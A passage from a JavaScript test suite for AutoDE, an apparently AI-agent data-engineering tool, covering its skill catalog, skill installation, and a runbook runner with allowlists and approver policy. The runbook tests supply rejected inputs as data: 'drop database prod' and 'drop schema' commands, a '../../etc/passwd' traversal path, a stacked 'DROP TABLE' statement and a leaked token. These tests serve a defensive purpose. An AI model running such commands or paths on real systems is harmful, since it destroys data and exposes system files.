      assert.strictEqual(ap.code, 0, ap.out + ap.err);
      // The old agents are gone.
      for (const f of ['src/agents/build/IngestionPipelineAgent.ts', 'src/agents/build/TransformationScaffolderAgent.ts', 'src/agents/llmCodegen.ts', 'src/agents/llmParamSelector.ts']) assert.ok(!nodeFs.existsSync(nodePath.join(__dirname, '..', f)), f);
      const hub = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'src', 'core', 'agentHub.ts'), 'utf8');
      assert.ok(!/ingestionAgent|VALID_AGENT_TYPES|runStageSteps/.test(hub));
    } finally { if (client) await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  // ---------- v0.45.5: the skill catalog and the naming convention ----------

  // A copy of AutoDE's resources (agents, skills, workflows) that a test can add skills to.
  const resourcesCopy = (extraSkills = {}) => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const res = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-res-'));
    for (const d of ['agents', 'skills', 'workflows']) nodeFs.cpSync(nodePath.join(wfRes(), d), nodePath.join(res, d), { recursive: true });
    for (const [name, text] of Object.entries(extraSkills)) { nodeFs.mkdirSync(nodePath.join(res, 'skills', name), { recursive: true }); nodeFs.writeFileSync(nodePath.join(res, 'skills', name, 'SKILL.md'), text); }
    return res;
  };
  const skillMd = (name, meta, body = 'Do it.') => `---\nname: ${name}\ndescription: A test skill.\nmetadata:\n${Object.entries(meta).map(([k, v]) => `  ${k}: ${Array.isArray(v) ? `[${v.join(', ')}]` : v}`).join('\n')}\n---\n${body}\n`;

  await test('v0.45.5: AutoDE\'s skills follow autode-<scope>-<capability> and declare their stage kinds, platforms, version and maturity; a skill that doesn\'t is refused item by item (an underscore name too: hosts reject it)', () => {
    const nodeFs = require('node:fs');
    const D = fresh('../dist/engine/agents/definitions.js');
    const pack = D.loadSkillPack(wfRes());
    assert.deepStrictEqual(pack.errors, []);
    assert.ok(pack.skills.length >= 8 && pack.skills.every((k) => D.AUTODE_SKILL_NAME.test(k.id) && k.meta.version >= 1 && ['tested', 'preview'].includes(k.meta.maturity)));
    assert.deepStrictEqual(pack.skills.find((k) => k.id === 'autode-de-mapping').meta, { scope: 'de', stageKinds: ['mapping'], platforms: ['any'], version: 1, owner: 'AutoDE', maturity: 'tested' });
    const res = resourcesCopy({
      'autode_de_bad': skillMd('autode_de_bad', { scope: 'de', stageKinds: ['build'], platforms: ['any'], version: 1, maturity: 'tested' }),
      'autode-snowflake-wide': skillMd('autode-snowflake-wide', { scope: 'snowflake', stageKinds: ['build'], platforms: ['any'], version: 1, maturity: 'preview' }),
      'autode-de-odd': skillMd('autode-de-odd', { scope: 'de', stageKinds: ['brewing'], platforms: ['mainframe'], version: 0, maturity: 'beta' })
    });
    try {
      const errors = D.loadSkillPack(res).errors.join('\n');
      assert.ok(/autode_de_bad: name must be lowercase words joined by dashes/.test(errors), errors);
      assert.ok(/autode-snowflake-wide: a snowflake skill has platforms: \[snowflake\]/.test(errors), errors);
      for (const x of ['unknown stage kind "brewing"', 'unknown platform "mainframe"', 'version must be a whole number', 'maturity is tested or preview']) assert.ok(errors.includes(x), x);
    } finally { nodeFs.rmSync(res, { recursive: true, force: true }); }
  });

  await test('v0.45.5: a stage gets the skills for its kind and the problem\'s target platform — a Snowflake skill joins the build on Snowflake, not on Databricks — and installed vendor skills are named in its assignment', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-plat-'));
    const home = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-home-'));
    const res = resourcesCopy({ 'autode-snowflake-loading': skillMd('autode-snowflake-loading', { scope: 'snowflake', stageKinds: ['build'], platforms: ['snowflake'], version: 1, maturity: 'preview' }, 'Load with COPY INTO.') });
    try {
      const { id, prob, W } = await tinyFlow(ws, cli);
      assert.strictEqual((await cli(['workflow', 'approve', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] })).code, 0);
      const A = fresh('../dist/engine/agents/assignment.js');
      const scope = { workspaceRoot: ws, resourcesRoot: res, problemId: id, home };
      const ctxFile = nodePath.join(prob, 'context', 'target-context.yaml');
      nodeFs.mkdirSync(nodePath.dirname(ctxFile), { recursive: true });
      nodeFs.writeFileSync(ctxFile, 'specId: x\nspecVersion: 1\nstatus: built\nplatform: snowflake\n');
      let a = A.assignmentFor(scope, 'build', []).assignment;
      assert.deepStrictEqual([a.role, a.skills.map((k) => k.id).sort()], ['pipeline-engineer', ['autode-de-pipeline-build', 'autode-snowflake-ingestion', 'autode-snowflake-loading', 'autode-snowflake-performance', 'autode-snowflake-pipelines']]);
      assert.ok(a.text.includes('Load with COPY INTO.'));
      nodeFs.writeFileSync(ctxFile, 'specId: x\nspecVersion: 1\nstatus: built\nplatform: databricks\n');
      a = A.assignmentFor(scope, 'build', []).assignment;
      assert.deepStrictEqual(a.skills.map((k) => k.id).sort(), ['autode-databricks-ingestion', 'autode-databricks-performance', 'autode-databricks-pipelines', 'autode-de-pipeline-build']);
      assert.ok(a.externalSkills.some((e) => e.name === 'databricks-pipelines' && !e.installed) && !/Vendor skills installed/.test(a.text), 'relevant, not installed: not offered as installed');
      assert.ok(/## Vendor skills that would help, not installed here[\s\S]*- databricks-pipelines[\s\S]*/.test(a.text) && /you never install anything/.test(a.text), 'v0.45.11: named, with how a person installs them');
      nodeFs.mkdirSync(nodePath.join(home, '.claude', 'skills', 'databricks-pipelines'), { recursive: true });
      nodeFs.writeFileSync(nodePath.join(home, '.claude', 'skills', 'databricks-pipelines', 'SKILL.md'), '---\nname: databricks-pipelines\n---\n');
      a = A.assignmentFor(scope, 'build', []).assignment;
      assert.ok(/## Vendor skills installed in this host[\s\S]*- databricks-pipelines \(Databricks\)/.test(a.text) && /AutoDE's rules still apply/.test(a.text), a.text.slice(-400));
      assert.ok(!a.externalSkills.some((e) => /^cortex|^coco/.test(e.name)), 'Snowflake references stay out of a Databricks problem');
    } finally { for (const d of [ws, home, res]) nodeFs.rmSync(d, { recursive: true, force: true }); }
  });

  await test('v0.45.5: the catalog — AutoDE, workspace, interview and external groups; external entries are references with a licence, a source and an own-words summary; a team corrects one without a release; install commands are probed, never trusted', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const C = fresh('../dist/engine/agents/skillCatalog.js');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-cat-'));
    try {
      let r = C.skillCatalog({ resourcesRoot: wfRes(), workspaceRoot: ws, home: ws, env: { PATH: '' } });
      assert.deepStrictEqual(r.errors, []);
      const groups = new Set(r.entries.map((e) => e.group));
      assert.ok(groups.has('autode') && !groups.has('interview') && groups.has('external'), 'v0.45.12: AutoDE interview parts are skills; the interview group holds a team JSON parts');
      const dabs = r.entries.find((e) => e.name === 'databricks-dabs');
      assert.deepStrictEqual([dabs.availability, dabs.licence.redistribution, dabs.installer.command, dabs.installed], ['installable', false, ['databricks', 'aitools', 'install'], []]);
      assert.ok(r.entries.find((e) => e.name === 'autode-de-mapping').roles.includes('sttm-mapper'));
      // No vendor text: the reference list holds no SKILL.md content, only metadata.
      const ext = nodeFs.readFileSync(nodePath.join(wfRes(), 'skills', 'external.yaml'), 'utf8');
      assert.ok(!/^---\nname:/m.test(ext) && !/allowed-tools/.test(ext));
      // A team corrects the command and adds a skill of its own.
      nodeFs.mkdirSync(nodePath.join(ws, '.autode', 'config'), { recursive: true });
      nodeFs.writeFileSync(nodePath.join(ws, '.autode', 'config', 'external-skills.yaml'), 'installers:\n  databricks-agent-skills:\n    command: [databricks, aitools, skills, install]\n    docs: https://example.com\nentries:\n  - id: house-loader\n    vendor: Our team\n    source: https://git.example.com/house-loader\n    licence: nowhere\n    availability: importable\n');
      r = C.skillCatalog({ resourcesRoot: wfRes(), workspaceRoot: ws, home: ws, env: { PATH: '' } });
      assert.deepStrictEqual(r.entries.find((e) => e.name === 'databricks-dabs').installer.command, ['databricks', 'aitools', 'skills', 'install']);
      assert.ok(r.errors.some((e) => /house-loader: licence "nowhere"/.test(e)) && r.errors.some((e) => /house-loader: a summary/.test(e)), r.errors.join('\n'));
      // Probes: an old CLI, a vanished subcommand, a good one.
      const inst = { id: 'x', command: ['databricks', 'aitools', 'install'], probe: ['databricks', 'aitools', '--help'], minCliVersion: '1.0.0', versionCommand: ['databricks', '--version'], docs: 'https://docs', verifiedAt: '2026-10-22' };
      const fake = (version, probeCode) => (argv) => argv.includes('--version') ? { code: 0, stdout: `Databricks CLI v${version}`, stderr: '' } : { code: probeCode, stdout: '', stderr: 'unknown command "aitools"' };
      assert.ok(/older than 1\.0\.0/.test(C.probeInstaller(inst, fake('0.240.0', 0)).reason));
      const gone = C.probeInstaller(inst, fake('1.20.0', 1));
      assert.ok(!gone.ok && /may have changed how these skills are installed/.test(gone.reason) && /2026-10-22/.test(gone.reason) && /https:\/\/docs/.test(gone.reason), gone.reason);
      assert.ok(C.probeInstaller(inst, fake('1.20.0', 0)).ok);
      assert.ok(/not installed|isn't installed/.test(C.probeInstaller(inst, () => ({ code: null, stdout: '', stderr: '', error: 'spawn databricks ENOENT' })).reason));
      // The generated page lists the references with their licences.
      const page = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'docs', 'skills.md'), 'utf8');
      assert.ok(page.includes('`autode-de-mapping`') && page.includes('[`databricks-dabs`]') && page.includes('Databricks License') && /Redistributable/.test(page));
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.5: autode skills list / show / check / install and autode_skills_list — installing is a person\'s act in a terminal, and "installed" means found in a host\'s skills folder', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-sk-'));
    const home = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-skh-'));
    let client;
    try {
      const env = { AUTODE_HOME: home, PATH: '' };
      const W = ['--workspace', ws];
      const l = await cli(['skills', 'list', ...W, '--json'], { env });
      assert.strictEqual(l.code, 0, l.out + l.err);
      assert.ok(l.json().skills.some((e) => e.name === 'autode-core-orchestrator') && l.json().skills.some((e) => e.group === 'external'));
      assert.ok(/External skills \(references; not shipped with AutoDE\)/.test((await cli(['skills', 'list', ...W], { env })).out));
      assert.strictEqual((await cli(['skills', 'list', '--group', 'vendors', ...W], { env })).code, 2);
      assert.ok(/Licence: Databricks License/.test((await cli(['skills', 'show', 'databricks-dabs', ...W], { env })).out));
      assert.strictEqual((await cli(['skills', 'show', 'nope', ...W], { env })).code, 5);
      assert.strictEqual((await cli(['skills', 'install', 'cortex-code-built-in', ...W], { env })).code, 1, 'host-only: nothing to install');
      const runs = [];
      const runner = (argv) => {
        runs.push(argv.join(' '));
        if (argv.includes('--version')) return { code: 0, stdout: 'Databricks CLI v1.20.0', stderr: '' };
        if (argv.includes('--help')) return { code: 0, stdout: 'install', stderr: '' };
        nodeFs.mkdirSync(nodePath.join(home, '.claude', 'skills', 'databricks-dabs'), { recursive: true });
        nodeFs.writeFileSync(nodePath.join(home, '.claude', 'skills', 'databricks-dabs', 'SKILL.md'), '---\nname: databricks-dabs\n---\n');
        return { code: 0, stdout: '', stderr: '' };
      };
      assert.strictEqual((await cli(['skills', 'check', 'databricks-dabs', ...W], { env, runner })).code, 0);
      assert.ok(!runs.includes('databricks aitools install'), 'check never installs');
      assert.strictEqual((await cli(['skills', 'install', 'databricks-dabs', ...W], { env, runner })).code, 4, 'a person at a terminal');
      assert.strictEqual((await cli(['skills', 'install', 'databricks-dabs', ...W], { env, runner, interactive: true, answers: ['no'] })).code, 4);
      assert.ok(!runs.includes('databricks aitools install'));
      const ok = await cli(['skills', 'install', 'databricks-dabs', ...W, '--json'], { env, runner, interactive: true, answers: ['install'] });
      assert.strictEqual(ok.code, 0, ok.out + ok.err);
      assert.ok(runs.includes('databricks aitools install') && ok.json().installed[0].includes(nodePath.join('.claude', 'skills')));
      // MCP: the same catalog, filtered.
      client = await mcpSession(ws);
      const m = (await client.callTool({ name: 'autode_skills_list', arguments: { group: 'autode' } })).structuredContent;
      assert.ok(m.skills.length >= 8 && m.skills.every((e) => e.group === 'autode'));
    } finally { if (client) await client.close(); for (const d of [ws, home]) nodeFs.rmSync(d, { recursive: true, force: true }); }
  });

  await test('v0.45.5: autode plugin install removes AutoDE\'s pre-v0.45.5 skill folders and anything its last install put there, never the user\'s own; the catalog ships everywhere; the Skills view is contributed', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-prune-'));
    try {
      const skills = nodePath.join(ws, '.claude', 'skills');
      const mk = (name, text) => { nodeFs.mkdirSync(nodePath.join(skills, name), { recursive: true }); nodeFs.writeFileSync(nodePath.join(skills, name, 'SKILL.md'), text); };
      mk('documentation', '---\nname: documentation\nallowed-tools: [mcp__autode__autode_resolve]\n---\nold AutoDE skill\n');
      mk('mapping', '---\nname: mapping\n---\nthe user\'s own mapping skill\n');
      const env = { AUTODE_HOME: nodePath.join(ws, 'home') };
      const r = await cli(['plugin', 'install', '--host', 'claude', '--workspace', ws, '--json'], { env });
      assert.strictEqual(r.code, 0, r.out + r.err);
      assert.ok(!nodeFs.existsSync(nodePath.join(skills, 'documentation')), 'AutoDE\'s old folder is gone');
      assert.ok(nodeFs.existsSync(nodePath.join(skills, 'mapping', 'SKILL.md')), 'the user\'s own skill of an old AutoDE name is kept');
      assert.ok(nodeFs.existsSync(nodePath.join(skills, 'autode-de-documentation', 'SKILL.md')));
      const manifest = JSON.parse(nodeFs.readFileSync(nodePath.join(skills, '.autode-installed.json'), 'utf8'));
      assert.ok(manifest.skills.includes('autode-de-mapping') && !manifest.skills.includes('mapping'));
      // A skill the last install recorded that AutoDE no longer has is removed next time.
      manifest.skills.push('autode-de-retired'); nodeFs.writeFileSync(nodePath.join(skills, '.autode-installed.json'), JSON.stringify(manifest));
      mk('autode-de-retired', '---\nname: autode-de-retired\n---\n');
      assert.strictEqual((await cli(['plugin', 'install', '--host', 'claude', '--workspace', ws], { env })).code, 0);
      assert.ok(!nodeFs.existsSync(nodePath.join(skills, 'autode-de-retired')));
      // Packaging and the view.
      const staged = require('../scripts/pack-cli.cjs').stage(nodePath.join(ws, 'pkg'));
      for (const f of ['skills/external.yaml', 'skills/autode-de-mapping/SKILL.md']) assert.ok(nodeFs.existsSync(nodePath.join(staged, f)), f);
      assert.ok(nodeFs.readFileSync(nodePath.join(__dirname, '..', '.vscodeignore'), 'utf8').includes('!skills/external.yaml'));
      const pkg = require('../package.json');
      assert.ok(pkg.contributes.views.autoDataEngineeringHub.some((v) => v.id === 'autoDataEngineeringHubSkills'));
      for (const c of ['refreshSkills', 'installSkill', 'openSkillSource']) assert.ok(pkg.contributes.commands.some((x) => x.command === `autoDataEngineeringHub.${c}`), c);
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  // ---------- v0.45.6: the runner ----------

  const conn = (id, platform, resolver = 'cli') => ({ id, platform, role: 'target', fields: {}, credentials: { resolver, ref: id.split(':')[1] }, allowSampleDataInPrompts: false, origin: 'file' });
  const runbookWs = (policyYaml) => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-rb-'));
    nodeFs.mkdirSync(nodePath.join(ws, '.autode', 'config'), { recursive: true });
    nodeFs.writeFileSync(nodePath.join(ws, '.autode', 'config', 'connections.yaml'), 'connections:\n  - platform: snowflake\n    credentials: { resolver: cli, ref: dev }\n  - platform: snowflake\n    credentials: { resolver: cli, ref: prod }\n  - platform: databricks\n    credentials: { resolver: cli, ref: lake }\n');
    if (policyYaml) nodeFs.writeFileSync(nodePath.join(ws, '.autode', 'config', 'approvals.yaml'), policyYaml);
    return ws;
  };
  const POLICY = 'runbooks:\n  environments:\n    dev: { connections: [snowflake:dev, databricks:lake], approvers: any }\n    prod: { connections: [snowflake:prod], approvers: [priya, arun], secondApprover: true, unattended: true }\n';
  const deployRunbook = (over = {}) => ({
    id: 'deploy-orders', title: 'Deploy the orders mart', reason: 'The model was approved.', connectionId: 'snowflake:dev', explanation: 'Creates the table, then loads it.',
    steps: [
      { id: 'check', title: 'Count the source', kind: 'sql', sql: 'SELECT COUNT(*) FROM shop.orders', expect: 'a row count' },
      { id: 'create', title: 'Create the mart', kind: 'sql', sql: 'CREATE TABLE mart.fct_orders (order_id INT)', expect: 'the table exists', rollback: { steps: [{ id: 'drop', title: 'Drop it', kind: 'sql', sql: 'DROP TABLE mart.fct_orders', expect: 'gone', noRollbackReason: 'it undoes the create' }] } },
      { id: 'copy', title: 'Upload the seed file', kind: 'cli', argv: ['snow', 'stage', 'copy', 'seeds/orders.csv', '@mart.seed'], expect: 'the file is on the stage' }
    ],
    ...over
  });

  await test('v0.45.6: the engine classifies every runbook step itself and refuses what it can\'t allow — off-allowlist commands, profile and credential flags, paths outside the workspace, destructive steps without a rollback, CLI steps without CLI credentials', () => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const R = fresh('../dist/engine/runner/runbook.js');
    const P = fresh('../dist/engine/runner/policy.js');
    const ws = runbookWs(POLICY);
    try {
      assert.deepStrictEqual(['SELECT 1', 'SHOW TABLES', "INSERT INTO t VALUES ('DROP')", 'CREATE TABLE t (a INT)', 'CREATE OR REPLACE TABLE t (a INT)', 'DROP TABLE t', 'TRUNCATE TABLE t', 'ALTER TABLE t DROP COLUMN a', 'INSERT OVERWRITE t SELECT 1', 'GRANT SELECT ON t TO ROLE r'].map((q) => R.classifySql(q).class),
        ['read', 'read', 'change', 'change', 'destructive', 'destructive', 'destructive', 'destructive', 'destructive', 'change']);
      assert.ok(R.classifySql('SELECT 1; DROP TABLE t').problem, 'one statement per step');
      const policy = P.loadRunbookPolicy(ws);
      const connections = [conn('snowflake:dev', 'snowflake'), conn('snowflake:env', 'snowflake', 'env'), conn('databricks:lake', 'databricks')];
      const ok = R.checkRunbook(deployRunbook(), { workspaceRoot: ws, connections, policy });
      assert.ok(ok.ok, ok.errors.join('\n'));
      assert.deepStrictEqual(ok.steps.map((s) => [s.id, s.class]), [['check', 'read'], ['create', 'change'], ['copy', 'change']]);
      assert.deepStrictEqual(ok.steps[2].run.argv.slice(-2), ['--connection', 'dev'], 'the runner adds the profile');
      assert.ok(ok.steps[1].dryRun && !ok.steps[0].dryRun && ok.environment.name === 'dev');
      const bad = R.checkRunbook(deployRunbook({ steps: [
        { id: 'a', title: 'x', kind: 'cli', argv: ['snow', 'sql', '-q', 'drop database prod'], expect: 'x' },
        { id: 'b', title: 'x', kind: 'cli', argv: ['snow', 'stage', 'copy', 'a.csv', '@s', '--connection', 'prod'], expect: 'x' },
        { id: 'c', title: 'x', kind: 'cli', argv: ['snow', 'stage', 'copy', '../../etc/passwd', '@s'], expect: 'x' },
        { id: 'd', title: 'x', kind: 'sql', sql: 'DROP TABLE mart.x', expect: 'x' },
        { id: 'e', title: 'x', kind: 'shell', expect: 'x' },
        { id: 'f', title: 'x', kind: 'cli', argv: ['databricks', 'fs', 'ls'], expect: 'x' }
      ] }), { workspaceRoot: ws, connections, policy }).errors.join('\n');
      for (const x of ['`snow sql -q` is not on the allowlist', '--connection is not allowed', '../../etc/passwd is outside the workspace', 'step d is destructive: give its rollback', 'kind is sql, cli or bundle', 'so the command starts with snow']) assert.ok(bad.includes(x), `${x}\n${bad}`);
      assert.ok(R.checkRunbook(deployRunbook({ connectionId: 'snowflake:env' }), { workspaceRoot: ws, connections, policy }).errors.some((e) => /resolver cli/.test(e)));
      const bundle = R.checkRunbook({ id: 'deploy-lake', title: 'Deploy', reason: 'r', connectionId: 'databricks:lake', steps: [{ id: 'b', title: 'Deploy the bundle', kind: 'bundle', folder: 'bundle', target: 'dev', expect: 'deployed' }] }, { workspaceRoot: ws, connections, policy });
      assert.ok(bundle.errors.some((e) => /no databricks\.yml/.test(e)));
      nodeFs.mkdirSync(nodePath.join(ws, 'bundle')); nodeFs.writeFileSync(nodePath.join(ws, 'bundle', 'databricks.yml'), 'bundle: { name: x }\n');
      const b2 = R.checkRunbook({ id: 'deploy-lake', title: 'Deploy', reason: 'r', connectionId: 'databricks:lake', steps: [{ id: 'b', title: 'Deploy the bundle', kind: 'bundle', folder: 'bundle', target: 'dev', expect: 'deployed' }] }, { workspaceRoot: ws, connections, policy });
      assert.ok(b2.ok, b2.errors.join());
      assert.deepStrictEqual([b2.steps[0].run.argv.slice(0, 3), b2.steps[0].dryRun.argv.slice(0, 3), b2.steps[0].run.argv.slice(-2)], [['databricks', 'bundle', 'deploy'], ['databricks', 'bundle', 'validate'], ['--profile', 'lake']]);
      // The team's own command.
      nodeFs.writeFileSync(nodePath.join(ws, '.autode', 'config', 'approvals.yaml'), POLICY + '  allowCommands:\n    - { argv: [snow, git, fetch], class: read }\n');
      assert.ok(R.checkRunbook(deployRunbook({ steps: [{ id: 'g', title: 'x', kind: 'cli', argv: ['snow', 'git', 'fetch', 'repo'], expect: 'x' }] }), { workspaceRoot: ws, connections, policy: P.loadRunbookPolicy(ws) }).ok);
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.6: the policy — an unlisted connection is production; production needs a named approver, a second one where the team asks, and never runs unattended', () => {
    const nodeFs = require('node:fs');
    const P = fresh('../dist/engine/runner/policy.js');
    const ws = runbookWs();
    try {
      let policy = P.loadRunbookPolicy(ws);
      const prod = P.environmentOf(policy, 'snowflake:anything');
      assert.strictEqual(prod.name, 'prod', 'no policy file: everything is production');
      assert.ok(/Nobody may approve runbooks for prod yet/.test(P.approverProblem(prod, 'priya', [])));
      nodeFs.writeFileSync(require('node:path').join(ws, '.autode', 'config', 'approvals.yaml'), POLICY);
      policy = P.loadRunbookPolicy(ws);
      const p = P.environmentOf(policy, 'snowflake:prod');
      assert.deepStrictEqual([p.secondApprover, p.unattended, P.approvalsNeeded(p)], [true, false, 2], 'unattended: true is ignored for prod');
      assert.strictEqual(P.approverProblem(p, 'Priya', []), undefined);
      assert.ok(/not an approver for prod/.test(P.approverProblem(p, 'mallory', [])));
      assert.ok(/must come from someone else/.test(P.approverProblem(p, 'priya', ['priya'])));
      assert.strictEqual(P.environmentOf(policy, 'snowflake:dev').unattended, true);
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.6: a runbook end to end — proposed (checked), approved by a person, run step by step in order through the host, dry runs, a failure stops it, rollback, a hash-chained log that shows tampering, an edit voids the approval, the stage is handed in', async () => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = runbookWs(POLICY);
    try {
      const { id, prob, W } = await tinyFlow(ws, cli);
      assert.strictEqual((await cli(['workflow', 'approve', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] })).code, 0);
      nodeFs.mkdirSync(nodePath.join(ws, 'seeds')); nodeFs.writeFileSync(nodePath.join(ws, 'seeds', 'orders.csv'), 'order_id\n1\n');
      const { DecisionStore } = fresh('../dist/engine/decisions/decisionStore.js');
      const Pr = fresh('../dist/engine/decisions/proposals.js');
      const R = fresh('../dist/engine/runner/runbook.js');
      const Run = fresh('../dist/engine/runner/run.js');
      const L = fresh('../dist/engine/runner/runLog.js');
      const P = fresh('../dist/engine/runner/policy.js');
      const store = new DecisionStore(ws);
      const ctx = { workspaceRoot: ws, problemRoot: prob, problemId: id };
      const badProposal = Pr.validateProposal('runbook', deployRunbook({ steps: [{ id: 'x', title: 'x', kind: 'sql', sql: 'DROP TABLE t', expect: 'x' }] }), ctx);
      assert.ok(!badProposal.ok && /destructive/.test(badProposal.errors.join()));
      const d = Pr.propose(store, ctx, 'runbook', deployRunbook({ stage: 'model' }), { proposedBy: { host: 'mcp', client: 'Claude Code' } });
      assert.deepStrictEqual([d.kind, d.stakes, d.status], ['runbook', 'high', 'pending']);
      assert.strictEqual(R.readRunbook(prob, 'deploy-orders'), undefined, 'nothing runnable before approval');
      store.resolve(d.id, { decision: 'approved', by: 'priya', channel: 'cli' });
      const applied = await Pr.applyDecision(store, d.id, ctx);
      assert.ok(applied.applied && /approved by priya \(dev\)/.test(applied.message), applied.message);
      const calls = [];
      let failCopy = true;
      const host = {
        sql: async (c, sql, mode) => { calls.push(`${mode}:${sql}`); return mode === 'read' ? '1 row(s).' : 'done'; },
        cli: async (argv) => { calls.push(`cli:${argv.join(' ')}`); return failCopy ? { code: 1, stdout: '', stderr: 'token=abc123secret refused' } : { code: 0, stdout: 'uploaded', stderr: '' }; }
      };
      const policy = P.loadRunbookPolicy(ws);
      const connections = fresh('../dist/engine/platform/connectionsConfig.js').loadConnectionsConfig(ws).connections;
      const base = { workspaceRoot: ws, problemRoot: prob, runbookId: 'deploy-orders', who: 'priya', channel: 'panel', host, connections, policy };
      let r = await Run.runStep({ ...base, action: 'run', stepId: 'create' });
      assert.ok(!r.ok && /next one is check/.test(r.message), 'in order');
      r = await Run.runStep({ ...base, action: 'dry-run', stepId: 'create' });
      assert.ok(r.ok && calls.includes('explain:CREATE TABLE mart.fct_orders (order_id INT)'));
      r = await Run.runStep({ ...base, action: 'run' }); assert.ok(r.ok && r.step === 'check');
      r = await Run.runStep({ ...base, action: 'run' }); assert.ok(r.ok && r.step === 'create' && calls.includes('write:CREATE TABLE mart.fct_orders (order_id INT)'));
      r = await Run.runStep({ ...base, action: 'run' });
      assert.ok(!r.ok && r.step === 'copy' && /nothing after it ran/.test(r.message));
      assert.ok(!/abc123secret/.test(r.output) && /token=\[REDACTED\]/.test(r.output), 'output is redacted');
      assert.ok(calls.some((c) => c.startsWith('cli:snow stage copy seeds/orders.csv @mart.seed --connection dev')));
      assert.strictEqual(R.readRunbook(prob, 'deploy-orders').status, 'failed');
      r = await Run.runStep({ ...base, action: 'rollback', stepId: 'create' });
      assert.ok(r.ok && calls.includes('write:DROP TABLE mart.fct_orders'));
      // The log: intact, then tampered.
      const logFile = R.runLogFile(prob, 'deploy-orders');
      assert.ok(L.verifyRunLog(logFile).ok && L.readRunLog(logFile).length >= 5);
      const lines = nodeFs.readFileSync(logFile, 'utf8').split('\n'); lines[1] = lines[1].replace('"ok":true', '"ok":false');
      nodeFs.writeFileSync(logFile, lines.join('\n'));
      assert.ok(!L.verifyRunLog(logFile).ok);
      // An edit voids the approval.
      const file = R.runbookFile(prob, 'deploy-orders');
      nodeFs.writeFileSync(file, nodeFs.readFileSync(file, 'utf8').replace('CREATE TABLE mart.fct_orders', 'CREATE TABLE mart.fct_all'));
      r = await Run.runStep({ ...base, action: 'run' });
      assert.ok(!r.ok && /edited after it was approved/.test(r.message));
      // A clean run hands the stage in.
      const d2 = Pr.propose(store, ctx, 'runbook', deployRunbook({ id: 'deploy-two', stage: 'model' }), { proposedBy: { host: 'mcp', client: 'Claude Code' } });
      store.resolve(d2.id, { decision: 'approved', by: 'priya', channel: 'panel' });
      await Pr.applyDecision(store, d2.id, ctx);
      failCopy = false;
      r = await Run.runRemaining({ ...base, runbookId: 'deploy-two' });
      assert.ok(r.ok && r.finished && /Every step ran/.test(r.message), r.message);
      const st = fresh('../dist/engine/workflows/instance.js').readWorkflow(prob).stages.find((s) => s.id === 'model');
      assert.ok(['awaiting-approval', 'done'].includes(st.record.status) && st.record.outputs.some((o) => o.endsWith('runbooks/deploy-two.yaml')), JSON.stringify(st.record));
      const vm = fresh('../dist/core/runbookViewModel.js').buildRunbookModel({ workspaceRoot: ws, problemRoot: prob, problemId: id, id: 'deploy-two', connections, policy });
      assert.ok(vm.status === 'ran' && vm.steps.every((s) => s.state === 'done') && vm.logIntact && vm.steps[1].class === 'change');
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.6: production — an agent proposes over MCP; the CLI shows the engine\'s classification; two different named approvers (decision, then autode runbook approve); a non-approver is refused; status over MCP', async () => {
    const nodeFs = require('node:fs');
    const ws = runbookWs(POLICY);
    let client;
    try {
      const { W } = await tinyFlow(ws, cli);
      client = await mcpSession(ws);
      const call = async (name, args) => (await client.callTool({ name, arguments: args })).structuredContent;
      const bad = await call('autode_propose_runbook', { runbook: deployRunbook({ connectionId: 'snowflake:prod', steps: [{ id: 'x', title: 'x', kind: 'cli', argv: ['snow', 'sql', '-q', 'drop schema mart'], expect: 'x' }] }) });
      assert.ok(bad.code === 'VALIDATION_FAILED' && /not on the allowlist/.test(JSON.stringify(bad)), JSON.stringify(bad));
      const p = await call('autode_propose_runbook', { runbook: deployRunbook({ connectionId: 'snowflake:prod', steps: deployRunbook().steps.slice(0, 2) }) });
      assert.ok(p.decision && p.decision.stakes === 'high', JSON.stringify(p));
      assert.strictEqual((await call('autode_resolve_decision', { id: p.decision.id, decision: 'approved', by: 'agent' })).code, 'PERMISSION_DENIED', 'an agent never approves');
      const show = await cli(['runbook', 'show', 'deploy-orders', ...W]);
      assert.ok(/create \[change\]/.test(show.out) && /Waits for approval/.test(show.out) && /\(prod\)/.test(show.out), show.out);
      assert.strictEqual((await cli(['runbook', 'approve', 'deploy-orders', ...W, '--by', 'mallory'], { interactive: true, answers: ['approve'] })).code, 1, 'mallory is not a prod approver: the decision fails to apply');
      const p2 = await call('autode_propose_runbook', { runbook: deployRunbook({ id: 'deploy-prod', connectionId: 'snowflake:prod', steps: deployRunbook().steps.slice(0, 2) }) });
      assert.strictEqual((await cli(['runbook', 'approve', 'deploy-prod', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] })).code, 0);
      let st = (await call('autode_runbook_status', { id: 'deploy-prod' })).runbooks[0];
